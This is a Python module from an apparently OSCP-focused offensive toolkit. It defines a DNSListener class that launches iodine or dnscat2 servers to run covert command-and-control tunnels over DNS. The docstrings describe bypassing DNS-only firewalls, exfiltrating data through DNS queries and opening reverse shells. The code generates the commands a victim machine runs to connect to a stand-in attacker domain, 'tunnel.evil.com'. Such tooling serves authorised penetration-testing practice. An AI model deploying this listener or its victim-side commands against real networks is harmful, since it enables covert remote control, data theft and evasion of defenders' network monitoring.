"""
DNS Tunnel Listener for covert channel communication.

Integrates with iodine and dnscat2 for DNS tunneling over port 53.
Use case: Bypass firewalls that only allow DNS traffic.

Usage:
    >>> from sessions.listeners.dns_listener import DNSListener
    >>> from sessions.manager import SessionManager
    >>>
    >>> # Start iodine DNS tunnel
    >>> listener = DNSListener(
    ...     domain='tunnel.evil.com',
    ...     session_manager=manager,
    ...     tool='iodine'
    ... )
    >>> listener.start()
    >>> print(f"Client command: {listener.get_client_command()}")
    >>>
    >>> # Start dnscat2 C2
    >>> listener = DNSListener(
    ...     domain='tunnel.evil.com',
    ...     session_manager=manager,
    ...     tool='dnscat2'
    ... )
    >>> listener.start()
"""

import subprocess
import threading
import time
import os
import uuid
import logging
from pathlib import Path
from typing import Dict, Any, List, Optional, Callable
from datetime import datetime

from ..interfaces import IListener
from ..models import Session, Listener, ShellCapabilities
from ..events import EventBus, SessionEvent
from ..storage.listener_store import ListenerRegistry

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DNSListener(IListener):
    """DNS tunnel listener for covert channel communication.

    Architecture:
    - Runs DNS tunnel server (iodine or dnscat2)
    - Creates TUN interface for network tunneling (iodine)
    - Provides interactive C2 over DNS (dnscat2)
    - Monitors DNS queries for new clients
    - Auto-registers sessions on first connection

    Tools:
    - iodine: Creates VPN-like tunnel over DNS (10.0.0.1/24 network)
    - dnscat2: Interactive C2 with command/control over DNS

    How it works:
    1. Attacker runs DNS server on authoritative domain
    2. Victim sends DNS queries with encoded data
    3. Server responds with DNS replies containing commands
    4. Full bidirectional tunnel established

    OSCP Use Case:
    - Firewall only allows DNS (port 53)
    - Exfiltrate data via DNS queries
    - Establish reverse shell over DNS tunnel
    - Pivot through DNS-only network segments

    Example:
        >>> listener = DNSListener(
        ...     domain='tunnel.evil.com',
        ...     session_manager=manager,
        ...     tool='iodine',
        ...     password='secret123'
        ... )
        >>> listener.start()
        >>> print(f"Client: {listener.get_client_command()}")
        >>> # Client runs: iodine -r tunnel.evil.com
        >>> # Tunnel established at 10.0.0.2
    """

    def __init__(
        self,
        domain: str,
        session_manager: Any,
        tool: str = 'iodine',
        password: Optional[str] = None,
        tunnel_network: str = '10.0.0.1',
        secret: Optional[str] = None
    ):
        """Initialize DNS tunnel listener.

        Args:
            domain: Authoritative domain name (e.g., tunnel.evil.com)
            session_manager: SessionManager instance
            tool: DNS tunnel tool ('iodine' or 'dnscat2')
            password: Password for iodine tunnel (default: auto-generated)
            tunnel_network: Tunnel network for iodine (default: 10.0.0.1)
            secret: Secret for dnscat2 (default: auto-generated)
        """
        self.domain = domain
        self.session_manager = session_manager
        self.tool = tool
        self.password = password or self._generate_password()
        self.tunnel_network = tunnel_network
        self.secret = secret or self._generate_password()

        # Internal state
        self.listener_id = str(uuid.uuid4())
        self.server_process: Optional[subprocess.Popen] = None
        self.monitor_thread: Optional[threading.Thread] = None
        self._running = False
        self._connection_callbacks: List[Callable[[str], None]] = []

        # Session tracking
        self.sessions: List[str] = []

        # Listener model
        self.listener = Listener(
            id=self.listener_id,
            protocol='dns',
            port=53,
            status='stopped',
            config={
                'tool': tool,
                'domain': domain,
                'password': self.password if tool == 'iodine' else None,
                'secret': self.secret if tool == 'dnscat2' else None,
                'tunnel_network': tunnel_network if tool == 'iodine' else None
            }
        )

        # Registry
        self.registry = ListenerRegistry()

    def _generate_password(self) -> str:
        """Generate random password/secret."""
        import secrets
        return secrets.token_urlsafe(16)

    def _check_tool_availability(self) -> bool:
        """Check if DNS tunnel tool is installed.

        Returns:
            True if tool is available, False otherwise
        """
        if self.tool == 'iodine':
            # Check for iodined binary
            result = subprocess.run(['which', 'iodined'], capture_output=True)
            return result.returncode == 0
        elif self.tool == 'dnscat2':
            # Check for dnscat2 ruby script
            dnscat2_path = Path('/opt/dnscat2/dnscat2.rb')
            return dnscat2_path.exists()
        return False

    def start(self) -> bool:
        """Start DNS tunnel server.

        Returns:
            True if started successfully

        Raises:
            RuntimeError: If tool not found or start fails

        Example:
            >>> listener = DNSListener('tunnel.evil.com', manager)
            >>> if listener.start():
            ...     print(f"DNS tunnel started on {listener.domain}")
        """
        if self._running:
            logger.warning("DNS listener already running")
            return False

        # Check tool availability
        if not self._check_tool_availability():
            raise RuntimeError(
                f"DNS tunnel tool '{self.tool}' not found. "
                f"Install: {'apt-get install iodine' if self.tool == 'iodine' else 'git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2'}"
            )

        # Check port availability (DNS = 53, requires root)
        if os.geteuid() != 0:
            logger.warning("DNS listener requires root privileges (port 53)")
            logger.info("Run with: sudo crack session dns-start ...")

        # Start appropriate tool
        if self.tool == 'iodine':
            return self._start_iodine()
        elif self.tool == 'dnscat2':
            return self._start_dnscat2()
        else:
            raise ValueError(f"Unknown DNS tool: {self.tool}")

    def _start_iodine(self) -> bool:
        """Start iodine DNS tunnel server.

        Iodine creates TUN device (like VPN):
        - Server gets 10.0.0.1
        - Client gets 10.0.0.2
        - Full IP tunneling over DNS

        Returns:
            True if started successfully
        """
        try:
            # Build iodined command
            # iodined -f -c -P password 10.0.0.1 tunnel.evil.com
            cmd = [
                'iodined',
                '-f',  # Foreground mode (easier monitoring)
                '-c',  # Disable client IP check (accept any client)
                '-P', self.password,  # Password
                self.tunnel_network,  # Tunnel network base
                self.domain  # Domain name
            ]

            logger.info(f"Starting iodine DNS tunnel on {self.domain}")
            logger.info(f"Command: {' '.join(cmd)}")

            # Start process
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Wait for startup
            time.sleep(2)

            # Check if process is still running
            if self.server_process.poll() is not None:
                # Process died
                stdout, stderr = self.server_process.communicate()
                raise RuntimeError(f"iodined failed to start: {stderr}")

            self._running = True

            # Update listener model
            self.listener.start()
            self.listener.pid = self.server_process.pid

            # Register with listener registry
            self.registry.register_listener(self.listener)

            # Start monitoring thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_iodine,
                daemon=True
            )
            self.monitor_thread.start()

            # Emit event
            EventBus.publish(SessionEvent.LISTENER_STARTED, {
                'listener_id': self.listener_id,
                'protocol': 'dns',
                'tool': 'iodine',
                'domain': self.domain,
                'port': 53
            })

            logger.info(f"[+] Iodine DNS tunnel started on {self.domain}")
            logger.info(f"[+] Tunnel network: {self.tunnel_network}/24")
            logger.info(f"[+] Password: {self.password}")
            logger.info(f"[+] Client command: {self.get_client_command()}")

            return True

        except Exception as e:
            logger.error(f"Failed to start iodine: {e}")
            self._running = False
            raise RuntimeError(f"Failed to start iodine: {e}")

    def _start_dnscat2(self) -> bool:
        """Start dnscat2 DNS C2 server.

        Dnscat2 provides interactive shell over DNS:
        - Command/response over DNS queries
        - Multiple concurrent sessions
        - Encryption with pre-shared secret

        Returns:
            True if started successfully
        """
        try:
            # Build dnscat2 command
            # ruby dnscat2.rb tunnel.evil.com --secret=secret123
            dnscat2_script = Path('/opt/dnscat2/dnscat2.rb')

            if not dnscat2_script.exists():
                raise RuntimeError("dnscat2 not found at /opt/dnscat2/dnscat2.rb")

            cmd = [
                'ruby',
                str(dnscat2_script),
                self.domain,
                f'--secret={self.secret}'
            ]

            logger.info(f"Starting dnscat2 DNS C2 on {self.domain}")
            logger.info(f"Command: {' '.join(cmd)}")

            # Start process
            self.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd='/opt/dnscat2'
            )

            # Wait for startup
            time.sleep(3)

            # Check if process is still running
            if self.server_process.poll() is not None:
                stdout, stderr = self.server_process.communicate()
                raise RuntimeError(f"dnscat2 failed to start: {stderr}")

            self._running = True

            # Update listener model
            self.listener.start()
            self.listener.pid = self.server_process.pid

            # Register with listener registry
            self.registry.register_listener(self.listener)

            # Start monitoring thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_dnscat2,
                daemon=True
            )
            self.monitor_thread.start()

            # Emit event
            EventBus.publish(SessionEvent.LISTENER_STARTED, {
                'listener_id': self.listener_id,
                'protocol': 'dns',
                'tool': 'dnscat2',
                'domain': self.domain,
                'port': 53
            })

            logger.info(f"[+] Dnscat2 DNS C2 started on {self.domain}")
            logger.info(f"[+] Secret: {self.secret}")
            logger.info(f"[+] Client command: {self.get_client_command()}")

            return True

        except Exception as e:
            logger.error(f"Failed to start dnscat2: {e}")
            self._running = False
            raise RuntimeError(f"Failed to start dnscat2: {e}")

    def _monitor_iodine(self):
        """Monitor iodine process output for new connections."""
        if not self.server_process:
            return

        logger.info("Started iodine monitor thread")

        try:
            while self._running and self.server_process.poll() is None:
                # Read output line by line
                line = self.server_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()
                logger.debug(f"iodine: {line}")

                # Detect new connection
                # Iodine logs: "Connection from 192.168.45.150"
                if 'connection from' in line.lower():
                    # Extract IP
                    parts = line.split()
                    if len(parts) >= 3:
                        client_ip = parts[-1].strip('.,;')
                        self._handle_new_connection(client_ip)

        except Exception as e:
            logger.error(f"Error in iodine monitor: {e}")

    def _monitor_dnscat2(self):
        """Monitor dnscat2 process output for new sessions."""
        if not self.server_process:
            return

        logger.info("Started dnscat2 monitor thread")

        try:
            while self._running and self.server_process.poll() is None:
                # Read output line by line
                line = self.server_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()
                logger.debug(f"dnscat2: {line}")

                # Detect new session
                # Dnscat2 logs: "New window created: 1"
                if 'new window created' in line.lower() or 'session established' in line.lower():
                    # Extract session info if possible
                    self._handle_new_connection('unknown')

        except Exception as e:
            logger.error(f"Error in dnscat2 monitor: {e}")

    def _handle_new_connection(self, client_ip: str):
        """Handle new DNS tunnel connection.

        Args:
            client_ip: Client IP address
        """
        logger.info(f"[+] New DNS tunnel connection from {client_ip}")

        try:
            # Create session
            session = self.session_manager.create_session(
                type='dns',
                target=client_ip,
                port=53,
                protocol='tunnel',
                shell_type='unknown',
                metadata={
                    'listener_id': self.listener_id,
                    'domain': self.domain,
                    'tool': self.tool,
                    'tunnel_network': self.tunnel_network if self.tool == 'iodine' else None,
                    'connection_time': datetime.now().isoformat()
                }
            )

            # Track session
            self.sessions.append(session.id)
            self.listener.add_session(session.id)

            logger.info(f"[+] Session {session.id[:8]} created for DNS tunnel")

            # Call registered callbacks
            for callback in self._connection_callbacks:
                try:
                    callback(session.id)
                except Exception as e:
                    logger.error(f"Error in connection callback: {e}")

        except Exception as e:
            logger.error(f"Error handling DNS connection: {e}")

    def stop(self) -> bool:
        """Stop DNS tunnel server.

        Returns:
            True if stopped successfully
        """
        if not self._running:
            return False

        self._running = False

        # Terminate server process
        if self.server_process:
            try:
                self.server_process.terminate()
                self.server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_process.kill()

        # Update listener model
        self.listener.stop()

        # Unregister from registry
        self.registry.unregister_listener(self.listener_id)

        # Emit event
        EventBus.publish(SessionEvent.LISTENER_STOPPED, {
            'listener_id': self.listener_id
        })

        logger.info(f"DNS tunnel listener stopped: {self.domain}")

        return True

    def restart(self) -> bool:
        """Restart DNS tunnel server.

        Returns:
            True if restarted successfully
        """
        self.stop()
        return self.start()

    def status(self) -> str:
        """Get current listener status.

        Returns:
            Status string ('running', 'stopped', 'crashed')
        """
        return self.listener.status

    def on_connection(self, callback: Callable[[str], None]) -> None:
        """Register callback for new connections.

        Args:
            callback: Function to call with session_id
        """
        self._connection_callbacks.append(callback)

    def get_active_sessions(self) -> List[str]:
        """Get list of active session IDs.

        Returns:
            List of session UUID strings
        """
        return self.sessions.copy()

    def get_client_command(self, server_ip: Optional[str] = None) -> str:
        """Generate client command for victim machine.

        Args:
            server_ip: Server IP (optional, defaults to <LHOST>)

        Returns:
            Client command string

        Example:
            >>> cmd = listener.get_client_command('192.168.45.200')
            >>> print(f"Run on victim: {cmd}")
        """
        server_ip = server_ip or '<LHOST>'

        if self.tool == 'iodine':
            # Iodine client command
            # iodine -r -P password tunnel.evil.com
            return f"iodine -r -P {self.password} {self.domain}"
        elif self.tool == 'dnscat2':
            # Dnscat2 client command
            # dnscat --secret=secret tunnel.evil.com
            return f"dnscat --secret={self.secret} {self.domain}"
        else:
            return "Unknown tool"

    def get_listener_info(self) -> Dict[str, Any]:
        """Get listener information.

        Returns:
            Dictionary with listener details
        """
        return {
            'listener_id': self.listener_id,
            'protocol': 'dns',
            'port': 53,
            'status': self.listener.status,
            'tool': self.tool,
            'domain': self.domain,
            'password': self.password if self.tool == 'iodine' else None,
            'secret': self.secret if self.tool == 'dnscat2' else None,
            'tunnel_network': self.tunnel_network if self.tool == 'iodine' else None,
            'session_count': len(self.sessions),
            'sessions': self.sessions,
            'pid': self.listener.pid,
            'client_command': self.get_client_command()
        }
